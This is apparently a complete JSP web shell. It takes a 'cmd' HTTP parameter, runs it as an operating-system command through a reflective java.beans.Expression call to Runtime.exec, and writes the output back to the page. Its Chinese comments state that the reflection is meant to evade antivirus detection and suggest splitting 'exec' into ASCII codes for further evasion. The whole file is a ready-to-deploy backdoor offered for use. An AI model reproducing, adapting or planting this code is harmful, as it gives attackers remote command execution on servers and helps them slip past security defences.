<%@ page language="java" pageEncoding="UTF-8" %>
<%
    String cmd = request.getParameter("cmd");
    // 这里的exec可以拆为四个字符的ASCII做进一步免杀
    java.beans.Expression shell = new java.beans.Expression(Runtime.getRuntime(),"exec",new Object[]{cmd});
    
	// 因为返回的结果是 Process 类型的，所以需要强制类型转换
	// 使用 getValue() 函数获得结果值
	java.io.InputStream in = ((Process)shell.getValue()).getInputStream();
    
	// 普通回显
    StringBuilder outStr = new StringBuilder();
    response.getWriter().print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        outStr.append(s + "\n");
    }
    response.getWriter().print(outStr.toString());
    response.getWriter().print("</pre>");
%>